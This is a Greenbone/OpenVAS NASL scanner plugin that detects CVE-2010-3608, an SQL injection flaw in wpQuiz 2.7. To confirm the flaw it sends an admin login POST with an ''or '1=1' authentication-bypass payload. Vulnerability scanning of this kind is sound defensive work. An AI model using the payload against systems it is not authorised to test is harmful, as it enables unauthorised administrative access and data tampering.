if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902315" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-09-29 09:26:02 +0200 (Wed, 29 Sep 2010)" );
	script_cve_id( "CVE-2010-3608" );
	script_bugtraq_id( 43384 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "wpQuiz Multiple SQL Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15075/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/1009-exploits/wpquiz27-sql.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "insight", value: "Input passed to the 'id' and 'password' parameters in 'admin.php'
  and 'user.php' scripts are not properly sanitised before being returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running wpQuiz and is prone multiple SQL Injection
  vulnerabilities" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to compromise
  the application, access or modify data, or exploit latent vulnerabilities in the underlying database." );
	script_tag( name: "affected", value: "wpQuiz version 2.7" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/wp_quiz", "/wpQuiz", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	req = http_get( item: NASLString( dir, "/upload/index.php" ), port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( res, "<title>wpQuiz >> Login - wpQuiz</title>" )){
		filename = NASLString( dir + "/upload/admin.php" );
		authVariables = "user=%27+or+%271%3D1&pass=%27+or+%271%3D1";
		req = NASLString( "POST ", filename, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Referer: http://", host, filename, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( authVariables ), "\\r\\n\\r\\n", authVariables );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, ">Administration Panel" ) || ContainsString( res, "AdminCP" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

